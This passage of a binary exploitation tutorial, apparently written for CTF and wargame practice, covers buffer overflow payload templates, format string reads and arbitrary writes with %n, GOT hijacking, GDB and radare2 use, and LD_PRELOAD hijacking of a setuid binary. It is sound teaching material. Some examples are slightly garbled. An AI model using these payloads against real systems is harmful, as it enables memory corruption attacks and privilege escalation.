<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>python -c &#39;print &quot;\x90&quot;*50 + &quot;30 Bytes of ShellCode&quot; + &quot;4 Bytes return address to NOP or shellcode in left&quot;&#39;
</pre></div>
</div>
<p>However, if somekind of check for alphanumeric characters is present for first 80 bytes you won’t be able to put your shellcode in those 80 bytes. At that point of time you should check if you can overflow post EIP and redirect. For example</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>python -c &#39;print &quot;A&quot;*80 + &quot;4 Bytes return address to NOP or shellcode in right&quot; + &quot;\x90&quot;*50 + &quot;30 Bytes of ShellCode&quot;&#39;
</pre></div>
</div>
</div></blockquote>
</div>
</div>
</div>
<div class="section" id="format-string-vulnerability">
<h2>Format String Vulnerability<a class="headerlink" href="#format-string-vulnerability" title="Permalink to this headline">¶</a></h2>
<div class="section" id="definition">
<h3>Definition<a class="headerlink" href="#definition" title="Permalink to this headline">¶</a></h3>
<p>If an attacker is able to provide the format string to an ANSI C format function in part or as a whole, a format string vulnerability is present. By doing so, the behaviour of the format function is changed, and the attacker may get control over the target application. A format string is an ASCIIZ string that contains text and format parameters. Example:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>printf (&quot;The magic number is: %d\n&quot;, 1911);
</pre></div>
</div>
</div>
<div class="section" id="behaviour-of-the-format-function">
<h3>Behaviour of the format function<a class="headerlink" href="#behaviour-of-the-format-function" title="Permalink to this headline">¶</a></h3>
<p>The behaviour of the format function is controlled by the format string. The function retrieves the parameters requested by the format string from the stack.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>printf (&quot;Number %d has no address, number %d has: %08x\n&quot;, i, a, &amp;a);
</pre></div>
</div>
<p>From within the printf function the stack looks like:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>stack top
. . .
&lt;&amp;a&gt;
&lt;a&gt;
&lt;i&gt;
 A
. . .
stack bottom
</pre></div>
</div>
</div>
<div class="section" id="crashing-the-program">
<h3>Crashing the Program<a class="headerlink" href="#crashing-the-program" title="Permalink to this headline">¶</a></h3>
<p>By utilizing format strings we can easily trigger some invalid pointer access by just supplying a format string like:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>printf (&quot;%s%s%s%s%s%s%s%s%s%s%s%s&quot;);
</pre></div>
</div>
<p>Because ‘%s’ displays memory from an address that is supplied on the stack, where a lot of other data is stored, too, our chances are high to read from an illegal address, which is not mapped.</p>
</div>
<div class="section" id="viewing-the-stack">
<h3>Viewing the stack<a class="headerlink" href="#viewing-the-stack" title="Permalink to this headline">¶</a></h3>
<p>How some parts of the stack memory by using a format string like this:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>printf (&quot;%08x.%08x.%08x.%08x.%08x\n&quot;);
</pre></div>
</div>
<p>This works, because we instruct the printf-function to retrieve five parameters from the stack and display them as 8-digit padded hexadecimal numbers. So a possible output may look like:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>40012980.080628c4.bffff7a4.00000005.08059c04
</pre></div>
</div>
<p>This is a partial dump of the stack memory, starting from the current bottom upward to the top of the stack — assuming the stack grows towards the low addresses.</p>
</div>
<div class="section" id="viewing-memory-at-any-location">
<h3>Viewing Memory at any location<a class="headerlink" href="#viewing-memory-at-any-location" title="Permalink to this headline">¶</a></h3>
<p>We can look at memory locations different from the stack memory by providing an address to the format string.</p>
<p>Our format string is usually located on the stack itself, so we already have near to full control over the space, where the format string lies. The format function internally maintains a pointer to the stack location of the current format parameter. If we would be able to get this pointer pointing into a memory space we can control, we can supply an address to the ‘%s’ parameter. To modify the stack pointer we can simply use dummy parameters that will ‘dig’ up the stack by printing junk:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>printf (&quot;AAA0AAA1_%08x.%08x.%08x.%08x.%08x&quot;);
</pre></div>
</div>
<p>The ‘%08x’ parameters increase the internal stack pointer of the format function towards the top of the stack. After more or less of this increasing parameters the stack pointer points into our memory: the format string itself. The format function always maintains the lowest stack frame, so if our buffer lies on the stack at all, it lies above the current stack pointer for sure. If we choose the number of ‘%08x’ parameters correctly, we could just display memory from an arbitrary address, by appending ‘%s’ to our string. In our case the address is illegal and would be ‘AAA0’. Lets replace it with a real one. Example:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>address = 0x08480110
address (encoded as 32 bit le string): &quot;\x10\x01\x48\x08&quot;
printf (&quot;\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|&quot;);
</pre></div>
</div>
<p>Will dump memory from 0x08480110 until a NUL byte is reached. If we cannot reach the exact format string boundary by using 4-Byte pops (‘%08x’), we have to pad the format string, by prepending one, two or three junk characters. 3 This is analog to the alignment in buffer overflow exploits.</p>
</div>
<div class="section" id="overwriting-of-arbitrary-memory">
<h3>Overwriting of Arbitrary Memory<a class="headerlink" href="#overwriting-of-arbitrary-memory" title="Permalink to this headline">¶</a></h3>
<p>There is the ‘%n’ parameter, which writes the number of bytes already printed, into a variable of our choice. The address of the variable is given to the format function by placing an integer pointer as parameter onto the stack. But if we supply a correct mapped and writeable address this works and we overwrite four bytes (sizeof (int)) at the address:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>&quot;\xc0\xc8\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n&quot;
</pre></div>
</div>
<p>The format string above will overwrite four bytes at 0xbfffc8c0 with a small integer number. We have reached one of our goals: we can write to arbitrary addresses. By using a dummy parameter ‘%nu’ we are able to control the counter written by ‘%n’, at least a bit.</p>
<div class="section" id="direct-parameter-access">
<h4>Direct Parameter Access<a class="headerlink" href="#direct-parameter-access" title="Permalink to this headline">¶</a></h4>
<p>The direct parameter access is controlled by the ‘$’ qualifier</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>printf (&quot;%6`\ d:raw-latex:`\n`&quot;, 6, 5, 4,3, 2, 1);
</pre></div>
</div>
<p>Prints ‘1’, because the ‘6$’ explicitly addresses the 6th parameter on the stack.</p>
<p>The above text is taken from and a good paper to read for format string is <a class="reference external" href="http://www.cis.syr.edu/~wedu/seed/Labs/Vulnerability/Format_String/files/formatstring-1.2.pdf">Exploiting Format String Vulnerabilities</a></p>
<blockquote>
<div></div></blockquote>
</div>
<div class="section" id="write-two-bytes">
<h4>Write two bytes<a class="headerlink" href="#write-two-bytes" title="Permalink to this headline">¶</a></h4>
<p>We can write two bytes by %hn and one byte by %hhn.</p>
</div>
<div class="section" id="write-four-bytes">
<h4>Write four bytes<a class="headerlink" href="#write-four-bytes" title="Permalink to this headline">¶</a></h4>
<p>How to write four bytes? Suppose we need to write 0x8048706 to the address 0xffffd64c.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>HOB:0x0804 LOB:0x8706

If HOB &lt; LOB

[addr+2][addr] = \x4e\xd\xff\xff\x4c\xd\xff\xff
%.[HOB - 8]x = 0x804 - 8 = 7FC (2044) = %.2044x
%[offset]$hn = %6\$hn
%.[LOB - HOB]x = 0x8706 - 0x804 = 7F02 (32514) = %.32514x
%[offset+1]`\ hn = %7$hn

python -c &#39;print &quot;\x4e\xd6\xff\xff\x4c\xd6\xff\xff&quot; +&quot;%.2044x%6\$hn %.32514x%7\$hn&quot;&#39;
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="shared-library">
<h2>Shared Library<a class="headerlink" href="#shared-library" title="Permalink to this headline">¶</a></h2>
<p>A library whose code segment can be shared among multiple processes and whose data segment is unique to each process is called a Shared Library, thereby saving huge amount of RAM and disk space.
Shared library is also referred using other names like dynamic library, shared object files, DSO and DLL(Windows).</p>
<div class="section" id="hijack-the-global-offset-table-with-pointers">
<h3>Hijack the Global Offset Table with pointers<a class="headerlink" href="#hijack-the-global-offset-table-with-pointers" title="Permalink to this headline">¶</a></h3>
<p><strong>Definition</strong></p>
<p>The Global Offset Table redirects position independent address calculations to an absolute location and is located in the .got section of an ELF executable or shared object. It stores the final (absolute) location of a function calls symbol, used in dynamically linked code. When a program requests to use printf() for instance, after the rtld locates the symbol, the location is then relocated in the GOT and allows for the executable via the Procedure Linkage Table, to directly access the symbols location.</p>
<p>When you disassemble main and printf statement is present, you will get like</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>0x080484b9 &lt;+60&gt;: call 0x8048330 printf@plt &lt;----PLT
</pre></div>
</div>
<p>if you further disassemble printf</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gdb-peda$ pdisass printf
Dump of assembler code for function printf@plt:
    0x08048330 &lt;+0&gt;: jmp DWORD PTR ds:0x8049788 &lt;----GOT Address
    0x08048336 &lt;+6&gt;: push 0x0
    0x0804833b &lt;+11&gt;: jmp 0x8048320 End of assembler dump.
</pre></div>
</div>
<p>Further disassembling the address 0x8049788</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gdb-peda$ pdisass 0x8049788
Dump of assembler code from 0x8049788 to 0x80497a8:
  0x08049788 &lt;printf@got.plt+0&gt;:   add    DWORD PTR ss:[eax+ecx*1],0x46
  0x0804978d &lt;fgets@got.plt+1&gt;:    add    DWORD PTR [eax+ecx*1],0x56
  0x08049791 &lt;puts@got.plt+1&gt;: add    DWORD PTR [eax+ecx*1],0x66
  0x08049795 &lt;__gmon_start__@got.plt+1&gt;:   add    DWORD PTR [eax+ecx*1],0x76
  0x08049799 &lt;__libc_start_main@got.plt+1&gt;:    add    DWORD PTR [eax+ecx*1],0x0
  0x0804979d &lt;data_start+1&gt;:   add    BYTE PTR [eax],al
  0x0804979f &lt;data_start+3&gt;:   add    BYTE PTR [eax],al
  0x080497a1 &lt;__dso_handle+1&gt;: add    BYTE PTR [eax],al
  0x080497a3 &lt;__dso_handle+3&gt;: add    BYTE PTR [eax],al
  0x080497a5 &lt;stdin@@GLIBC_2.0+1&gt;: add    BYTE PTR [eax],al
  0x080497a7 &lt;stdin@@GLIBC_2.0+3&gt;: add    BYTE PTR [eax],al
End of assembler dump.
</pre></div>
</div>
<p>Objdump reflects the same (notice the +1) GOT address:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>objdump --dynamic-reloc ./behemoth3

./behemoth3:     file format elf32-i386

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049778 R_386_GLOB_DAT    __gmon_start__
080497a4 R_386_COPY        stdin
08049788 R_386_JUMP_SLOT   printf
0804978c R_386_JUMP_SLOT   fgets
08049790 R_386_JUMP_SLOT   puts
08049794 R_386_JUMP_SLOT   __gmon_start__
08049798 R_386_JUMP_SLOT   __libc_start_main
</pre></div>
</div>
<p>Quick diagram what it looks like:</p>
<p>So a quick diagram of what happens looks kind’a like this:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>[printf()] &lt;--------------------------------
   |                                       |
   --------------&gt; [PLT]---&gt;[d_r_resolve]--|
                     |           |         |
                     --------------------&gt;[GOT]&lt;--
                                 |               |
                                  -------&gt;[libc]--
</pre></div>
</div>
<p>A good paper to read about and from where the definition and diagram is taken is <a class="reference external" href="https://www.exploit-db.com/raw/13203/">How to Hijack the Global Offset Table with pointers</a></p>
</div>
</div>
<div class="section" id="tips-and-tricks">
<h2>Tips and Tricks<a class="headerlink" href="#tips-and-tricks" title="Permalink to this headline">¶</a></h2>
<ul class="simple">
<li>Probably, sometimes, we have to use <a class="reference external" href="https://www.exploit-db.com/exploits/34060/">Socket re-use shellcode</a></li>
<li>To attach to a network process in gdb, you might have to use</li>
</ul>
<blockquote>
<div><div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gdb-peda$ set follow-fork-mode child
</pre></div>
</div>
</div></blockquote>
<ul class="simple">
<li>If the parent is killed, children become children of the init process (that has the process id 1 and is launched as the first user process by the kernel). The init process checks periodically for new children, and kills them if they have exited (thus freeing resources that are allocated by their return value).</li>
</ul>
</div>
<div class="section" id="appendix-i-gdb-basics">
<h2>Appendix-I GDB Basics<a class="headerlink" href="#appendix-i-gdb-basics" title="Permalink to this headline">¶</a></h2>
<div class="section" id="getting-inputs">
<h3>Getting inputs<a class="headerlink" href="#getting-inputs" title="Permalink to this headline">¶</a></h3>
<p>Taken from <a class="reference external" href="https://reverseengineering.stackexchange.com/questions/13928/managing-inputs-for-payload-injection">Managing inputs for payload injection?</a></p>
<div class="section" id="getting-inputs-from-char-argv">
<h4>Getting inputs from char *argv[]<a class="headerlink" href="#getting-inputs-from-char-argv" title="Permalink to this headline">¶</a></h4>
<p>We can read the arguments from the initial command line</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>$&gt; ./program $(python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39;)
</pre></div>
</div>
<p>In gdb, we can pass the arguments through the run command line:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) run $(python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39;)
</pre></div>
</div>
</div>
<div class="section" id="getting-inputs-from-a-file">
<h4>Getting inputs from a file<a class="headerlink" href="#getting-inputs-from-a-file" title="Permalink to this headline">¶</a></h4>
<p>We can also provide input from file</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>$&gt; ./program ./myfile.txt
</pre></div>
</div>
<p>And, within gdb</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) run myfile.txt
</pre></div>
</div>
<p>Then, outside of gdb you can rewrite the content of the file and run your program again and again in gdb.</p>
</div>
<div class="section" id="getting-inputs-from-stdin">
<h4>Getting inputs from stdin<a class="headerlink" href="#getting-inputs-from-stdin" title="Permalink to this headline">¶</a></h4>
<p>Getting the input through stdin can be achieve through a wide variety of functions such as fgets(), scanf(), getline(), read() and others. It raises a few problems because the program stop while executing and wait to be fed with characters.</p>
<p>In case you have to deal with several inputs (eg login, password, …), you need to use separators between the inputs. Usually the separator between each input is just a newline character (n or r depending on the system you are in).</p>
<p>Now, you have two ways of doing to feed the stdin. Either we pass the file</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>$&gt; cat ./mycommands.txt | ./program
</pre></div>
</div>
<p>The stdin requires to run the command either through a file</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) run &lt; ./mycommands.txt
</pre></div>
</div>
<p>And do as said in the previous case.</p>
<p>The other option is to pipe the output of a command to the stdin of the program</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>$&gt; python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39; | ./program
</pre></div>
</div>
<p>In gdb we can use the bash process substitution &lt;(cmd) trick:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) run &lt; &lt;(python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39;)
</pre></div>
</div>
<p>This way is much quicker than effectively creating a named pipe and branch your program on it. Creating the named pipe outside of gdb requires a lot of unnecessary steps where you have it instantly with the previous technique.</p>
<p>Note also that, some people are using &lt;&lt;$(cmd) like this:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) run &lt;&lt;&lt; $(python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39;)
</pre></div>
</div>
<p>But, this last technique seems to filter out all NULL bytes (for whatever reason), so you should prefer the first one (especially if you want to pass NULL bytes).</p>
</div>
<div class="section" id="getting-inputs-from-network">
<h4>Getting inputs from network<a class="headerlink" href="#getting-inputs-from-network" title="Permalink to this headline">¶</a></h4>
<p>We can use netcat nc. Basically, if your vulnerable program is listening on localhost:666 then the command line would be:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>$&gt; python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39; | nc -vv localhost 666
</pre></div>
</div>
<p>Within gdb, the point will be to run (r) the program and to connect to it from another terminal.</p>
</div>
<div class="section" id="keep-the-stdin-open-after-injection">
<h4>Keep the stdin open after injection<a class="headerlink" href="#keep-the-stdin-open-after-injection" title="Permalink to this headline">¶</a></h4>
<p>Most of the techniques for stdin will send the exploit string to the program which will end shortly after the termination of the input. This mainly happens in gets buffer overflow, so, the stdin should be closed and reopened. The best way to keep it open afterward and get an active shell is to add a cat waiting for input on its stdin. It should look like this if you go though a file:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>$&gt; (cat ./mycommands.txt; cat) | ./program
</pre></div>
</div>
<p>Or, if you want a shell command:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>$&gt; (python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39;; cat) | ./program
</pre></div>
</div>
<p>Or, finally, if you are going through the network:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>$&gt; (python -c &#39;print(&quot;\xef\xbe\xad\xde&quot;)&#39;; cat) | nc -vv localhost 666
</pre></div>
</div>
</div>
</div>
<div class="section" id="examining-data">
<h3>Examining Data<a class="headerlink" href="#examining-data" title="Permalink to this headline">¶</a></h3>
<div class="section" id="examining-functions">
<h4>Examining functions<a class="headerlink" href="#examining-functions" title="Permalink to this headline">¶</a></h4>
<p>info functions command : Dislays the list of functions in the debugged program</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x00000000000005a0  _init
0x00000000000005d0  setresgid@plt
0x00000000000005e0  system@plt
0x00000000000005f0  printf@plt
0x0000000000000600  getegid@plt
0x0000000000000620  _start
0x0000000000000650  deregister_tm_clones
0x0000000000000690  register_tm_clones
0x00000000000006e0  __do_global_dtors_aux
0x0000000000000720  frame_dummy
0x000000000000072a  vuln
0x0000000000000765  main
0x00000000000007c0  __libc_csu_init
0x0000000000000830  __libc_csu_fini
0x0000000000000834  _fini
</pre></div>
</div>
<p>Run it before running the program, otherwise all linked functions would also be shown.</p>
<p><strong>Disassembling Functions</strong></p>
<p>GDB</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>disassemble main
</pre></div>
</div>
<p>GDB-Peda</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>pdisass main
</pre></div>
</div>
</div>
<div class="section" id="examining-memory">
<h4>Examining Memory<a class="headerlink" href="#examining-memory" title="Permalink to this headline">¶</a></h4>
<p>We can use the command x (for “examine”) to examine memory in any of several formats, independently of your program’s data types.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>x/nfu addr
x addr
x
</pre></div>
</div>
<p>Use the x command to examine memory.</p>
<p>n, f, and u are all optional parameters that specify how much memory to display and how to format it; addr is an expression giving the address where you want to start displaying memory.</p>
<ul class="simple">
<li>n, the repeat count : The repeat count is a decimal integer; the default is 1. It specifies how much memory (counting by units u) to display.</li>
<li>f, the display format : The display format is one of the formats used by print, ‘s’ (null-terminated string), or ‘i’ (machine instruction). The default is ‘x’ (hexadecimal) initially. The default changes each time you use either x or print.</li>
<li>u, the unit size : The unit size is any of</li>
</ul>
<blockquote>
<div><ul class="simple">
<li>b Bytes.</li>
<li>h Halfwords (two bytes).</li>
<li>w Words (four bytes). This is the initial default.</li>
<li>g Giant words (eight bytes).</li>
</ul>
</div></blockquote>
</div>
<div class="section" id="id1">
<h4>Examining Data<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
<p>Sometimes, you need to know the address of the variable, inorder to write arbitary value in to it.</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>run gdb &lt;program&gt; p &amp;&lt;variablename&gt;
</pre></div>
</div>
<p>We can also use</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) info address variable_name
Symbol &quot;variable_name&quot; is static storage at 0x903278.
</pre></div>
</div>
<p>Find the address of a string using GDB?</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) info proc map
process 930
Mapped address spaces:

   Start Addr           End Addr       Size     Offset objfile
     0x400000           0x401000     0x1000        0x0 /myapp
     0x600000           0x601000     0x1000        0x0 /myapp
     0x601000           0x602000     0x1000     0x1000 /myapp
 0x7ffff7a1c000     0x7ffff7bd2000   0x1b6000        0x0 /usr/lib64/libc-2.17.so
 0x7ffff7bd2000     0x7ffff7dd2000   0x200000   0x1b6000 /usr/lib64/libc-2.17.so
 0x7ffff7dd2000     0x7ffff7dd6000     0x4000   0x1b6000 /usr/lib64/libc-2.17.so
 0x7ffff7dd6000     0x7ffff7dd8000     0x2000   0x1ba000 /usr/lib64/libc-2.17.so

 (gdb) find 0x7ffff7a1c000,0x7ffff7bd2000,&quot;/bin/sh&quot;
 0x7ffff7b98489
 1 pattern found.
 (gdb) x /s 0x7ffff7b98489
 0x7ffff7b98489: &quot;/bin/sh&quot;
 (gdb) x /xg 0x7ffff7b98489
 0x7ffff7b98489: 0x0068732f6e69622f
</pre></div>
</div>
</div>
<div class="section" id="examining-frames">
<h4>Examining Frames<a class="headerlink" href="#examining-frames" title="Permalink to this headline">¶</a></h4>
<p>Here we would interpret GDB “info frame” output?</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) info frame
Stack level 0, frame at 0xb75f7390:
eip = 0x804877f in base::func() (testing.cpp:16); saved eip 0x804869a
called by frame at 0xb75f73b0
source language c++.
Arglist at 0xb75f7388, args: this=0x0
Locals at 0xb75f7388, Previous frame&#39;s sp is 0xb75f7390
Saved registers:
ebp at 0xb75f7388, eip at 0xb75f738c
</pre></div>
</div>
<ul class="simple">
<li><strong>stack level 0</strong> : frame num in backtrace, 0 is current executing frame, which grows downwards, in consistence with the stack.</li>
<li><strong>frame at 0xb75f7390</strong> : starting memory address of this stack frame</li>
<li><strong>eip = 0x804877f in base::func() (testing.cpp:16); saved eip 0x804869a</strong> : eip is the register for next instruction to execute (also called program counter). so at this moment, the next to execute is at “0x804877f”, which is line 16 of testing.cpp.</li>
<li><strong>saved eip “0x804869a”</strong> is so called “return address”, i.e., the instruction to resume in caller stack frame after returning from this callee stack. It is pushed into stack upon “CALL” instruction (save it for return).</li>
<li><strong>called by frame at 0xb75f73b0</strong> : the address of the caller stack frame</li>
<li><strong>source language c++</strong> : which language in use</li>
<li><strong>Arglist at 0xb75f7388, args: this=0x0</strong> : the starting address of arguments</li>
<li><strong>Locals at 0xb75f7388</strong> : address of local variables.</li>
<li><strong>Previous frame’s sp is 0xb75f7390</strong> : this is where the previous frame´s stack pointer point to (the caller frame), at the moment of calling, it is also the starting memory address of called stack frame.</li>
<li><strong>Saved registers</strong> : These are the two addresses on the callee stack, for two saved registers.</li>
</ul>
<blockquote>
<div><ul class="simple">
<li>ebp at 0xb75f7388 that is the address where the “ebp” register of the caller´s stack frame saved (please note, it is the register, not the caller´s stack address). i.e., corresponding to “PUSH %ebp”. “ebp” is the register usually considered as the starting address of the locals of this stack frame, which use “offset” to address. In another word, the operations of local variables all use this “ebp”, so you will see something like mov -0x4(%ebp), %eax, etc.</li>
<li>eip at 0xb75f738c as mentioned before, but here is the address of the stack (which contains the value “0x804877f”).</li>
</ul>
</div></blockquote>
</div>
<div class="section" id="examining-registers">
<h4>Examining Registers<a class="headerlink" href="#examining-registers" title="Permalink to this headline">¶</a></h4>
<p>We can refer to machine register contents, in expressions, as variables with names starting with ‘$’. The names of registers are different for each machine; use info registers to see the names used on your machine.</p>
<ul class="simple">
<li>info registers : Print the names and values of all registers except floating-point registers (in the selected stack frame).</li>
<li>info all-registers : Print the names and values of all registers, including floating-point registers.</li>
<li>info registers regname … : Print the relativized value of each specified register regname. As discussed in detail below, register values are normally relative to the selected stack frame. regname may be any register name valid on the machine you are using, with or without the initial ‘$’.</li>
</ul>
</div>
<div class="section" id="setting-program-variable">
<h4>Setting program variable<a class="headerlink" href="#setting-program-variable" title="Permalink to this headline">¶</a></h4>
<p>Either</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>set variable i = 10
</pre></div>
</div>
<p>or update arbitary (writable) location by address</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>(gdb) set {int}0x83040 = 4
</pre></div>
</div>
</div>
</div>
</div>
<div class="section" id="radare2-basics">
<h2>Radare2 Basics<a class="headerlink" href="#radare2-basics" title="Permalink to this headline">¶</a></h2>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>r2 -Ad ./crackme0x01 : Opens r2 in debug mode with the Analyze all flag active
afll : Lists all functions and their location in memory
s sym.main : Seeks to function sym.main. Address in prompt will change
pdf @ sym.main (which means something like “show me the main function without seek to it”) could be used.

pdf : &quot;Print Disassembling Function&quot;
iz : Shows the strings present in the data section. One can use izz to see the strings for the entire binary
db 0x12345678 : Sets a breakpoint at address 0x12345678. It&#39;s possible to set more than one breakpoint
dc : Runs the program until it hits a breakpoint
dr : Shows the content of all registers. Use dr &lt;register&gt; for a specific register
afvd : Shows the content of all local/args variables
pf Prints formatted data. Use pf?? to see available formats and pf??? for examples
? 0x10 Converts the number 0x10 to the most common bases
</pre></div>
</div>
</div>
<div class="section" id="appendix-ii-ld-preload">
<h2>Appendix-II LD_PRELOAD<a class="headerlink" href="#appendix-ii-ld-preload" title="Permalink to this headline">¶</a></h2>
<div class="section" id="hijacking-functions">
<h3>Hijacking Functions<a class="headerlink" href="#hijacking-functions" title="Permalink to this headline">¶</a></h3>
<p>Let’s say there’s a function getrand which generates a random path for the files to be stored</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>int getrand(char **path)
{
 char *tmp;
 int pid;
 int fd;

 srandom(time(NULL));

 tmp = getenv(&quot;TEMP&quot;);
 pid = getpid();

 asprintf(path, &quot;%s/%d.%c%c%c%c%c%c&quot;, tmp, pid,
   &#39;A&#39; + (random() % 26), &#39;0&#39; + (random() % 10),
   &#39;a&#39; + (random() % 26), &#39;A&#39; + (random() % 26),
   &#39;0&#39; + (random() % 10), &#39;a&#39; + (random() % 26));

 fd = open(*path, O_CREAT|O_RDWR, 0600);
 unlink(*path);
 return fd;
}
</pre></div>
</div>
<p>If we see the above function, getpid figures out the PID of the program, unlink deletes the file and random provides a random number.</p>
<p>We also need to check if the binary is dynamically linked or not?</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>file /home/flagXX/flagXX
/home/flagXX/flagXX: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, not stripped
</pre></div>
</div>
<p>If so, then we can create a c file to override the functions we want – random(), unlink() and getpid():</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>hacking_randomfile.c

// Take control of random
int random(){
   return 0;
}

// Stop the file being deleted
int unlink(const char *pathname) {
   return 0;
}

// Take control of the reported PID
int getpid() {
   return 1;
}
</pre></div>
</div>
<p>Now, we need to compile this with</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>gcc hacking_randomfile.c -o hacking_randomfile -shared -fPIC
</pre></div>
</div>
<p>Using gcc we’ve specified the normal input file (hacking_randomfile.c) and output file (-o hacking_randomfile), but we’ve also specified two additional options:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>-shared to make a library and
-fPIC to specify Position Independent Code, which is necessary for making a shared library.
</pre></div>
</div>
<p>Now that we’ve built hacking_randomfile as a shared library, here’s the basic usage:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>$ LD_PRELOAD=&quot;$PWD/hacking_randomtime&quot; ./main_targetfile
</pre></div>
</div>
<p>SANS has written a blog about <a class="reference external" href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">Go To The Head Of The Class: LD_PRELOAD For The Win</a></p>
<div class="section" id="important-things-to-note">
<h4>Important things to note<a class="headerlink" href="#important-things-to-note" title="Permalink to this headline">¶</a></h4>
<ul class="simple">
<li>Function definition should be correct</li>
<li>Funtion input and return type should also be correct.</li>
</ul>
</div>
</div>
<div class="section" id="controlling-uninitialized-memory-with-ld-preload">
<h3>Controlling uninitialized memory with LD_PRELOAD<a class="headerlink" href="#controlling-uninitialized-memory-with-ld-preload" title="Permalink to this headline">¶</a></h3>
<p>Dan Rosenberg has documented this technique at <a class="reference external" href="http://vulnfactory.org/blog/2010/04/08/controlling-uninitialized-memory-with-ld_preload/">Controlling uninitialized memory with LD_PRELOAD</a> The below stuff is directly taken from the blog post.</p>
<p>A local Linux user can exercise a degree of control over uninitialized memory on the stack when executing a program. This happens because of the way the Linux linker/loader, ld.so, handles the LD_PRELOAD environment variable. This variable allows users to specify libraries to be preloaded, effectively allowing users to override functions used in a particular binary. However, regardless of whether or not libraries specified via LD_PRELOAD are actually loaded at runtime, ld.so copies the name of each library onto the stack prior to executing the program, and doesn’t clean up after itself. By specifying a very long LD_PRELOAD variable and executing a binary, a portion of the stack will be overwritten with part of the LD_PRELOAD variable during linking, and it will stay that way once execution of the program begins, even on setuid binaries, where the library itself is not loaded.</p>
<p>This means we can initialise the memory to something under out control:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>$ export LD_PRELOAD=`python -c &#39;print &quot;/bin/getflag\x0a&quot;*1000&#39;`
</pre></div>
</div>
<p>i.e. fill the stack with one thousand /bin/getflags.</p>
<p>Then when we run flagXX with length of 1, it will almost certainly have this in the buffer already:</p>
<div class="highlight-None notranslate"><div class="highlight"><pre><span></span>$ echo -ne &quot;Content-Length: 1\n &quot; | /home/flagXX/flagXX
sh: !getflag: command not found
getflag is executing on a non-flag account, this doesn&#39;t count
getflag is executing on a non-flag account, this doesn&#39;t count
getflag is executing on a non-flag account, this doesn&#39;t count
... lots of repeats ...
sh: line 74: /bin/getfl=qm: No such file or directory
</pre></div>
</div>
<p>Of course, the LD_PRELOAD variable is ignored with setuid binaries, since otherwise an attacker could trivially override arbitrary functions in setuid binaries and easily take control of a system.</p>
</div>
<div class="section" id="libc-rpath">
<h3>LIBC - Rpath<a class="headerlink" href="#libc-rpath" title="Permalink to this headline">¶</a></h3>
